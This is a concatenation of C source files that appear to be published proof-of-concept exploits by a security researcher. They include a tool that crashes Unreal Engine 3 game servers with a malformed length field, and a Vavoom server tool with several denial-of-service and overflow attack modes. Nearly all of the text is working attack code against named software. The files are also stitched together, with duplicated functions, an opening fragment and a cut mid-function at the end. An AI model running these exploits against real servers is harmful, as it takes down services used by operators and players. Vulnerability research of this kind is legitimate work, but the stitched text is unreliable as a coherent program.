    len = send_recv(sd, GS1_QUERY, sizeof(GS1_QUERY) - 1, buff, sizeof(buff), peer, 0);
    if(len < 0) goto quit;

    printf("\n- handle reply:\n");
    gs_handle_info(buff, len,
        1, '\\', 0, 0,
        "gamever",  &gamever,
        "hostport", &hostport,
        NULL,       NULL);

    if(gamever) {
        retver = atoi(gamever);
    }
    if(hostport) {
        peer->sin_port = htons(atoi(hostport));
        printf("\n- set hostport %hu\n", ntohs(peer->sin_port));
    }

quit:
    close(sd);
    return(retver);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



int write_unrser(int num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    for(b = 1; b && (b < max); b <<= 1) {
        bits = write_bits((num & b) ? 1 : 0, 1, buff, bits);
    }
    return(bits);
}



int write_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; in++) {
        bits = write_bits(*in, 8, out, bits);
    }
    return(bits);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 2)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-2);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*
    Copyright 2008 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <ctype.h>
#include <time.h>
#include "rwbits.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
    #define stristr strcasestr
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        7777
#define BUFFSZ      1024    // the max supported is 576

#define GS2_QUERY   "\xfe\xfd\x00" "\x00\x00\x00\x00"                    "\xff\x00\x00" "\x00"
#define GS3_QUERY   "\xfe\xfd\x09" "\x00\x00\x00\x00"
#define GS3_QUERYX  "\xfe\xfd\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00" "\xff\x00\x00" "\x00"



int unreal_build_pck(int bug, u8 *buff, int pck, ...);
int unreal_info(struct sockaddr_in *peer);
int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



    /* unrealfp */



int     aafix           = 0,    // America's Army uses 0x800 instead of 0x3ff
        u3fix           = 0,    // Unreal 3 no longer uses index numbers
        rvfix           = 0,    // RavenShiel uses 0x50f instead of 0x3ff (this is useless since it's enough compatible with AA)
        pariahfix       = 0,    // Pariah
        movfix          = 0,    // Men of Valor
        first_time      = 1;



int read_unreal_index(u8 *index_num, int *ret) {
    int     len,
            result;
    u8      b0 = index_num[0],
            b1 = index_num[1],
            b2 = index_num[2],
            b3 = index_num[3],
            b4 = index_num[4];

    if(u3fix) {
        *ret = b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
        return(4);
    }

    result = 0;
    len    = 1;
    if(b0 & 0x40) {
        len++;
        if(b1 & 0x80) {
            len++;
            if(b2 & 0x80) {
                len++;
                if(b3 & 0x80) {
                    len++;
                    result = b4;
                }
                result = (result << 7) | (b3 & 0x7f);
            }
            result = (result << 7) | (b2 & 0x7f);
        }
        result = (result << 7) | (b1 & 0x7f);
    }
    result = (result << 6) | (b0 & 0x3f);
    if(b0 & 0x80) result = -result;
    *ret = result;
    return(len);
}



int write_unreal_index(int number, u8 *index_num) {
    int     len,
            sign = 1;

    if(u3fix) {
        index_num[0] = number & 0xff;
        index_num[1] = (number >> 8) & 0xff;
        index_num[2] = (number >> 16) & 0xff;
        index_num[3] = (number >> 24) & 0xff;
        return(4);
    }

    if(number < 0) {
        number = -number;
        sign = -1;
    }

    len = 1;
    index_num[0] = (number & 0x3f);
    if(number >>= 6) {
        index_num[0] += 0x40;
        index_num[1] = (number & 0x7f);
        len++;
        if(number >>= 7) {
            index_num[1] += 0x80;
            index_num[2] = (number & 0x7f);
            len++;
            if(number >>= 7) {
                index_num[2] += 0x80;
                index_num[3] = (number & 0x7f);
                len++;
                if(number >>= 7) {
                    index_num[3] += 0x80;
                    index_num[4] = number;
                    len++;
                }
            }
        }
    }
    if(sign < 0) index_num[0] += 0x80;
    return(len);
}



u32 read_bitx(u32 bits, u8 *in, u32 *in_bits) {
    u32     ret;

    ret = read_bits(bits, in, *in_bits);
    *in_bits += bits;
    return(ret);
}



int read_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; out++) {
        *out = read_bitx(8, in, &bits);
    }
    return(bits);
}



int write_bitmem(u8 *in, int inlen, u8 *out, int bits) {
    for(; inlen--; in++) {
        bits = write_bits(*in, 8, out, bits);
    }
    return(bits);
}



int write_unrnum(int num, u8 *buff, int bits) {
    int     len;
    u8      mini[5];

    len = write_unreal_index(num, mini);
    return(write_bitmem(mini, len, buff, bits));
}



int read_unrnum(int *num, u8 *buff, int bits) {
    u8      mini[5];

    *num = 0;
    read_bitmem(buff, 5, mini, bits);
    return(bits + (read_unreal_index(mini, num) << 3));
}



int write_unrser(int num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    for(b = 1; b && (b < max); b <<= 1) {
        bits = write_bits((num & b) ? 1 : 0, 1, buff, bits);
    }
    return(bits);
}



int read_unrser(int *num, u8 *buff, int bits, int max) {    // forcompability with core.dll
    int     b;

    *num = 0;
    for(b = 1; b && (b < max); b <<= 1) {
        if(read_bitx(1, buff, &bits)) *num += b;
    }
    return(bits);
}



u8 *unreal_parse_pck(u8 *buff, int size, int *chall) {
    static int  retfix  = 0,
                done    = 0;
    static u8   str[BUFFSZ];
    int     b,
            btmp,
            blen,
            bsize,
            len,
            pck,
            val3ff,
            val8,
            val1000,
            n,
            n1,
            n2,
            n3,
            n4;

    val8 = 0x8;
    if(pariahfix) val8 = 0x4;
    val3ff = 0x3ff;
    if(aafix) val3ff = 0x800;
    if(rvfix) val3ff = 0x50f;   // takes the same number of bits of AA... it's useless
    val1000 = 0x1000;
    if(movfix) val1000 = 0x1e00;

    if(size <= 0) return(NULL);
    n = buff[size - 1];
    if(!n) return(NULL);
    for(bsize = (size << 3) - 1; !(n & 0x80); n <<= 1, bsize--);

    b = read_unrser(&pck, buff, 0, 0x4000);
    while(b < bsize) {
        if(read_bitx(1, buff, &b)) {
            b = read_unrser(&n, buff, b, 0x4000);
            continue;
        }
        if(read_bitx(1, buff, &b)) {
            n1 = read_bitx(1, buff, &b);
            n2 = read_bitx(1, buff, &b);
        } else {
            n1 = n2 = 0;
        }
        n3 = read_bitx(1, buff, &b);
        b = read_unrser(&n, buff, b, val3ff);
        if(n3) b = read_unrser(&n, buff, b, 0x400);
        if(n1 || n3) {
            b = read_unrser(&n4, buff, b, val8);
        } else {
            n4 = 0;
        }

        b = read_unrser(&blen, buff, b, val1000);
        if((b + blen) > bsize) break;

        if(n4 != 1) {
            b += blen;
            continue;
        }

        for(btmp = b + blen; b < btmp;) {
            b = read_unrnum(&len, buff, b);
            if((len < 0) || (len > (sizeof(str) - 1))) break; 
            b = read_bitmem(buff, len, str, b);
            str[len] = 0;
            printf("  %s\n", str);
            if(!done) done++;
        }
        b = btmp;
    }

    if(!done) {
        retfix++;
        if(retfix == 1) return("NOFIX");
        if(retfix == 2) return("AAFIX");
        //if(retfix == 3) return("U3FIX"); already default
        if(retfix == 3) return("RVFIX");
        if(retfix == 4) return("PARIAHFIX");
        if(retfix == 5) return("MOVFIX");
        printf("\n"
            "Error: seems that this game requires a specific compatibility fix\n"
            "       try to relaunch this tool another time\n"
            "\n");
        exit(1);
    }
    return(NULL);
}



int unreal_send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int *chall, u8 **errmsg) {
    int     len;

    len = send_recv(sd, in, insz, out, outsz, peer, first_time);
    if(len < 0) {
        if(len == -1) std_err();
        *errmsg = NULL;
        return(-1);
    }

    if(first_time) first_time = 0;
    if(!out) return(0);

    *errmsg = unreal_parse_pck(out, len, chall);
    if(*errmsg) return(-1);
    return(len);
}



void activate_fix(int *fix) {
    u8      *str    = NULL;

    aafix       = 0;
    u3fix       = 0;
    rvfix       = 0;
    pariahfix   = 0;
    movfix      = 0;
    if(!fix) {
        printf("- deactivate the compatibility fixes\n");
        return;
    }
    *fix = 1;
    if(fix == &aafix)          str = "America's Army";
    else if(fix == &u3fix)     str = "Unreal 3 engine";
    else if(fix == &rvfix)     str = "Raven Shield";
    else if(fix == &pariahfix) str = "Pariah/Warpath";
    else if(fix == &movfix)    str = "Men of Valor";
    printf("- activate the %s compatibility fixes\n", str);
}



    /* unrealfp */



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    struct  linger  ling = {1,1};
    int     sd,
            len;
    u16     port    = PORT;
    u8      buff[BUFFSZ],
            *host,
            *errmsg;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Server termination in Unreal engine 3 "VER"\n"
        "  Unreal Tournament 3 <= 1.3, Fuel of War <= 1.1.1 and more\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    host = argv[1];

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    // not needed
    // if(port != 7777) unreal_info(&peer);

    activate_fix(&u3fix);

    printf("- check server type for possible compatibility fixes\n");
    for(;;) {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();   // required for scanning the fixes
        setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));

        len = unreal_build_pck(0, buff, 0, "HELLO P=1 REVISION=0", NULL);
        len = unreal_send_recv(sd, buff, len, buff, BUFFSZ, &peer, NULL, &errmsg);
        if(len >= 0) break;
        close(sd);

        if(!errmsg) {
            continue;
        } else if(!strcmp(errmsg, "NOFIX")) {
            activate_fix(NULL);
        } else if(!strcmp(errmsg, "AAFIX")) {
            activate_fix(&aafix);
        } else if(!strcmp(errmsg, "U3FIX")) {
            activate_fix(&u3fix);
        } else if(!strcmp(errmsg, "RVFIX")) {
            activate_fix(&rvfix);
        } else if(!strcmp(errmsg, "PARIAHFIX")) {
            activate_fix(&pariahfix);
        } else if(!strcmp(errmsg, "MOVFIX")) {
            activate_fix(&movfix);
        } else {
            printf("\nError: \"%s\"\n", errmsg);
            exit(1);
        }
    }

    printf("- send malformed packet\n");
    len = unreal_build_pck(1, buff, 0, "HELLO P=1 REVISION=0", NULL);   // required by the game: "HELLO P="
    send_recv(sd, buff, len, NULL, 0, &peer, 0);
    send_recv(sd, buff, len, NULL, 0, &peer, 0);    // make sure it arrives

    close(sd);
    sleep(ONESEC);

    printf("- check server:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();
    len = unreal_build_pck(0, buff, 0, "HELLO P=1 REVISION=0", NULL);
    if(send_recv(sd, buff, len, buff, BUFFSZ, &peer, 0) < 0) {
        printf("\n  Server IS vulnerable!!!\n");
    } else {
        printf("\n  Server doesn't seem vulnerable\n");
    }
    close(sd);
    return(0);
}



int unreal_build_pck(int bug, u8 *buff, int pck, ...) {
    va_list ap;
    int     b,
            sl,
            len,
            bpos,
            bsize,
            val3ff,
            val8,
            val1000;
    u8      *s;

        //devastation is not supported, it uses 0x4000 1 1 0x4000 1 1 1 1 0x3ff 0x1000 

    val8 = 0x8;
    if(pariahfix) val8 = 0x4;
    val3ff = 0x3ff;
    if(aafix) val3ff = 0x800;
    if(rvfix) val3ff = 0x50f;   // takes the same number of bits of AA... it's useless
    val1000 = 0x1000;
    if(movfix) val1000 = 0x1e00;

    b = 0;
    b = write_unrser(pck, buff, b, 0x4000);
    b = write_bits(0, 1, buff, b);
    if(!pck) {
        b = write_bits(1, 1, buff, b);  // 1
        b = write_bits(1, 1, buff, b);
        b = write_bits(0, 1, buff, b);
    } else {
        b = write_bits(0, 1, buff, b);  // 0
    }
    if(!pck) {
        b = write_bits(1, 1, buff, b);  // 1
        b = write_unrser(0, buff, b, val3ff);
        b = write_unrser(pck + 1, buff, b, 0x400);
        b = write_unrser(1, buff, b, val8);
    } else {
        b = write_bits(0, 1, buff, b);  // 0
        b = write_unrser(0, buff, b, val3ff);
    }

    bpos = b;
    b = write_unrser(0, buff, b, val1000);
    bsize = b;
    va_start(ap, pck);
    while((s = va_arg(ap, u8 *))) {
        sl = strlen(s) + 1;
        if(sl == 1) continue;               // skip empty
        b = write_unrnum(bug ? 0x7fffffff : sl, buff, b);
        b = write_bitmem(s, sl, buff, b);   // in reality they are index numbers
    }
    va_end(ap);
    write_unrser(b - bsize, buff, bpos, val1000);

    write_bits(0, 8, buff, b);  // zero pad
    len = b >> 3;
    if(!(buff[len] & 0x80)) buff[len] |= (1 << (b & 7));
    len++;
    return(len);
}



int unreal_info(struct sockaddr_in *peer) {
    u32     chall;
    int     sd,
            len,
            retver      = 0;
    u8      buff[4096],
            gs3[sizeof(GS3_QUERYX) - 1],
            *gamever    = NULL,
            *hostport   = NULL;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("- send info queries\n");
          send_recv(sd, GS2_QUERY, sizeof(GS2_QUERY) - 1, NULL, 0, peer, 0);
          send_recv(sd, GS3_QUERY, sizeof(GS3_QUERY) - 1, NULL, 0, peer, 0);
    len = send_recv(sd, NULL, 0, buff, sizeof(buff), peer, 0);
    if(len < 0) goto quit;
    if(buff[0] == 9) {
        memcpy(gs3, GS3_QUERYX, sizeof(GS3_QUERYX) - 1);
        chall = atoi(buff + 5);
        gs3[7]  = chall >> 24;
        gs3[8]  = chall >> 16;
        gs3[9]  = chall >>  8;
        gs3[10] = chall;
        len = send_recv(sd, gs3, sizeof(GS3_QUERYX) - 1, buff, sizeof(buff), peer, 0);
        if(len < 0) goto quit;
    }

    printf("\n- handle reply:\n");
    gs_handle_info(buff, len,
        0, '\0', 5, 0,
        "gamever",  &gamever,
        "hostport", &hostport,
        NULL,       NULL);

    if(gamever) {
        retver = atoi(gamever);
    }
    if(hostport && hostport[0]) {
        peer->sin_port = htons(atoi(hostport));
        printf("- set hostport %hu\n", ntohs(peer->sin_port));
    }

quit:
    close(sd);
    return(retver);
}



int gs_handle_info(u8 *data, int datalen, int nt, int chr, int front, int rear, ...) {
    va_list ap;
    int     i,
            args,
            found;
    u8      **parz,
            ***valz,
            *p,
            *limit,
            *par,
            *val;

    va_start(ap, rear);
    for(i = 0; ; i++) {
        if(!va_arg(ap, u8 *))  break;
        if(!va_arg(ap, u8 **)) break;
    }
    va_end(ap);

    args = i;
    parz = malloc(args * sizeof(u8 *));
    valz = malloc(args * sizeof(u8 **));

    va_start(ap, rear);
    for(i = 0; i < args; i++) {
        parz[i]  = va_arg(ap, u8 *);
        valz[i]  = va_arg(ap, u8 **);
        *valz[i] = NULL;
    }
    va_end(ap);

    found  = 0;
    limit  = data + datalen - rear;
    *limit = 0;
    data   += front;
    par    = NULL;
    val    = NULL;

    for(p = data; (data < limit) && p; data = p + 1, nt++) {
        p = strchr(data, chr);
        if(p) *p = 0;

        if(nt & 1) {
            if(!par) continue;
            val = data;
            printf("  %30s %s\n", par, val);

            for(i = 0; i < args; i++) {
                if(!stricmp(par, parz[i])) *valz[i] = val;
            }
        } else {
            par = data;
        }
    }

    free(parz);
    free(valz);
    return(found);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            //fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 2)) break;
        }
    } else {
        if(timeout(sd, 3) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-2);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    //fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <zlib.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>

void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <sys/param.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER             "0.1"
#define PORT            26000
#define BUFFSZ          8192
#define MAXSZ           (0x7ff - NET_HEADERSIZE)    // this is the max
#define BOFSZ           1040                        // less than CBOFSZ and major than MAX_DATAGRAM
#define CBOFSZ          0x7ff                       // 1200 (or less) is enough
#define FLAGZ(x,y)      x | (y & NETFLAG_COMPR_LEN_MASK) | ((len << 16) & NETFLAG_LENGTH_MASK)
#define NICK            "\\class\\0"    \
                        "\\color\\0"    \
                        "\\name\\"

#define NET_HEADERSIZE  10
#define MAX_DATAGRAM    1024
#define MAX_INFO_STRING 1024
#define MaxSize         4096

enum {
    clc_bad,
    clc_nop,
    clc_disconnect,
    clc_move,
    clc_stringcmd,
    clc_player_info,
};

//  NetHeader flags
#define NETFLAG_COMPR_LEN_MASK	0x000007ff
#define NETFLAG_COMPR_MODE_MASK	0x0000f800
#define NETFLAG_LENGTH_MASK		0x07ff0000
#define NETFLAG_FLAGS_MASK		0xf8000000
#define NETFLAG_COMPR_NONE		0x00000000
#define NETFLAG_COMPR_ZIP		0x00000800
#define NETFLAG_EOM				0x08000000
#define NETFLAG_ACK				0x10000000
#define NETFLAG_DATA			0x20000000
#define NETFLAG_UNRELIABLE		0x40000000
#define NETFLAG_CTL				0x80000000

//  Client request
#define CCREQ_CONNECT			1
#define CCREQ_SERVER_INFO		2

//  Server reply
#define CCREP_ACCEPT			11
#define CCREP_REJECT			12
#define CCREP_SERVER_INFO		13



int info_proto(u_char *data, int len);
u_short vavoom_crc(u_char *data, int len);
int mycpy(u_char *dst, u_char *src);
int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int timeout(int sock, int sec);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    long    clen;
    u_int   seed,
            *flags,
            *seq,
            seqn;
    int     sd,
            i,
            len,
            ulen,
            ver  = 1,
            attack;
    u_short port = PORT,
            cport,
            *crc;
    u_char  buff[BUFFSZ],
            cbof[MAXSZ],
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Vavoom <= 1.19.1 multiple vulnerabilities " VER "\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\n"
            "Usage: %s <attack> <host> [port(%hu)]\n"
            "\n"
            "Attack:\n"
            " 1 = socket unreachable through empty or big packet\n"
            " 2 = decompression crash (unexploitable buffer-overflow)\n"
            " 3 = SV_BroadcastPrintf / Serialize crash (caused by bug 2)\n"
            " 4 = SV_SetUserInfo crash / Info_SetValueForKey: oversize infostring\n"
            "     (caused by bug 2)\n"
            "\n", argv[0], port);
        exit(1);
    }

    attack = atoi(argv[1]);

    if(argc > 3) port    = atoi(argv[3]);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    flags = (u_int *)buff;
    seq   = (u_int *)(buff + 4);
    crc   = (u_short *)(buff + 8);
    seed  = time(NULL);

    printf("- query server:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    p      = buff + 4;
    *p++   = CCREQ_SERVER_INFO;
    p     += mycpy(p, "VAVOOM");
    *p++   = ver;
    len    = p - buff;
    *flags = htonl(FLAGZ(NETFLAG_CTL, 0));

    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);
    close(sd);
    ver = info_proto(buff, len);

    if(attack == 1) {
        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();

        printf("- send zero length packet\n");
        send_recv(sd, buff, 0, buff, sizeof(buff), 0);

        printf("- send big packet\n");
        send_recv(sd, buff, MaxSize + 1, buff, sizeof(buff), 0);

        close(sd);
        goto quit;
    }

    printf("- start connection:\n");
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    printf("- send connection request\n");
    p      = buff + 4;
    *p++   = CCREQ_CONNECT;
    p     += mycpy(p, "VAVOOM");
    *p++   = ver;
    len    = p - buff;
    *flags = htonl(FLAGZ(NETFLAG_CTL, 0));

    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);

    if(buff[4] != CCREP_ACCEPT) {
        printf("\nError: your connection has not been accepted\n\n");
        exit(1);
    }

    cport = *(u_short *)(buff + 5); // I don't know why this is not in network byte order
    printf("- use server port %hu\n", cport);
    peer.sin_port = htons(cport);
    seqn = 0;

    printf("- send ack\n");         // useless
    p      = buff + NET_HEADERSIZE;
    len    = p - buff;
    *flags = htonl(FLAGZ(NETFLAG_ACK, 0));
    *seq   = seqn++;
    *crc   = htons(0);

    len = send_recv(sd, buff, len, buff, sizeof(buff), 1);

    if(attack == 2) {
        printf("- lot of compressed data\n");
        p      = buff + NET_HEADERSIZE;

        ulen   = CBOFSZ;    // uncompressed size
        clen   = MAXSZ;     // compressed size (not important, just enough big)
        memset(cbof, 'A', ulen);
        compress(p, &clen, cbof, ulen);
        p     += clen;
        len    = p - buff;

        *flags = htonl(FLAGZ(NETFLAG_DATA | NETFLAG_UNRELIABLE | NETFLAG_COMPR_ZIP, ulen));
        *seq   = seqn++;
        *crc   = htons(vavoom_crc(buff + NET_HEADERSIZE, len - NET_HEADERSIZE));

    } else if(attack == 3) {
        printf("- big say string\n");
        p      = buff + NET_HEADERSIZE;

        ulen   = BOFSZ;
        clen   = MAXSZ;
        *cbof  = clc_stringcmd;
        memset(cbof + 1, 'A', ulen);
        memcpy(cbof + 1, "Say ", 4);
        cbof[ulen - 1] = 0;
        compress(p, &clen, cbof, ulen);
        p     += clen;
        len    = p - buff;

        *flags = htonl(FLAGZ(NETFLAG_DATA | NETFLAG_UNRELIABLE | NETFLAG_COMPR_ZIP, ulen));
        *seq   = seqn++;
        *crc   = htons(vavoom_crc(buff + NET_HEADERSIZE, len - NET_HEADERSIZE));

    } else if(attack == 4) {
        printf("- big user info\n");
        p      = buff + NET_HEADERSIZE;

        ulen   = BOFSZ;
        clen   = MAXSZ;
        *cbof  = clc_player_info;
        memset(cbof + 1, 'A', ulen);
        memcpy(cbof + 1, NICK, sizeof(NICK) - 1);
        cbof[ulen - 1] = 0;
        compress(p, &clen, cbof, ulen);
        p     += clen;
        len    = p - buff;

        *flags = htonl(FLAGZ(NETFLAG_DATA | NETFLAG_UNRELIABLE | NETFLAG_COMPR_ZIP, ulen));
        *seq   = seqn++;
